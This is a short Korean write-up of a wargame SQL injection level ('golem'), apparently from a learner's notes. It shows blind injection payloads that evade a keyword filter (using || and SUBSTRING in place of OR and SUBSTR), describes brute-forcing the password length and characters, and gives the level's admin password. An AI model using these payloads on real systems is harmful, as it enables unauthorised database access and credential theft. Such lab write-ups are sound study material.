## Q11. golem _ 
<img src="/photo/prob_11.PNG" width="100%" height="100%" alt="problem"></img>

### 제한 문자: OR / AND / SUBSTR( / = <br> 문제 사항: admin의 패스워드를 찾아라.
### 해결책

```
패스워드를 찾아야하므로 먼저 패스워드 길이를 찾아봄
=> length()함수 사용
=> 숫자 증가시키며 패스워드 길이 찾음
=> 반복되는 작업이므로 파이썬 코드를 이용함
=> 밑의 쿼리가 참이므로 패스워드 길이 = 8
```
```diff
# 현재 쿼리문: where id='guest' and pw=''||length(pw)<9-- '
```
<참고> Python 코드 : [패스워드 길이 탐색](code/11_pwlength.py)
```
길이를 알아냈으므로 각자리의 문자 확인
=> SUBSTR()함수를 이용
but. SUBSTR()함수 사용X
=> 동일한 문자열 함수 SUBSTRING() 사용
```
```diff
# 현재 쿼리문: where id='guest' and pw=''||ascii(substring(pw,1,1))<56-- '
```
<참고> Python 코드 : [패스워드 문자 탐색](code/11_pw.py)
```
해결 쿼리문: where id='guest' and pw='77d6290b'
```
### CERT <br> Python 코드 : [패스워드 길이 탐색](code/11_pwlength.py) / [패스워드 문자 탐색](code/11_pw.py)

### 느낀점
```diff
+ SQL 문자열 추출 함수를 추가로 배웠다.
+ SUBSTRING(컬럼명 혹은 문자열, 시작위치, 골라낼 글자 수)
```
